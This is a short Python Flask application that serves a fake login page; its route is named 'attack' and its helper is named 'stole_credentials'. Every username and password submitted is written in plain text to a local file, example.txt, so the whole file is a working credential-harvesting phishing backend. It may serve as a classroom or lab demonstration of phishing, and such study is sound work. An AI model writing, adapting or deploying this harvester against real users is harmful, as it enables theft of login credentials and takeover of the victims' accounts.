from flask import Flask,request,render_template

app = Flask(__name__)
@app.route('/')
def home():
    return render_template("home.html")

@app.route('/login', methods=['GET','POST'])
def attack():
    error = None
    if request.method == 'POST':
        name=request.form['username']
        pwd=request.form['pwd']
        if name!= "" or pwd!="":
            stole_credentials(name,pwd)
        else:
            error = 'Invalid username/password'
    else:
        return render_template("login.html")
    # the code below is executed if the request method
    # was GET or the credentials were invalid
    return render_template('login.html', error=error)



def stole_credentials(user,pwd):
    file_path = 'example.txt'
    # Open the file in 'write' mode ('w')
    # This will create a new file if it doesn't exist or truncate the file if it exists
    with open(file_path, 'a+') as file:
        # Write content to the file
        file.write("Username:"+user+" Pwd: "+pwd+"\n")
    return render_template("home.html",name=user)
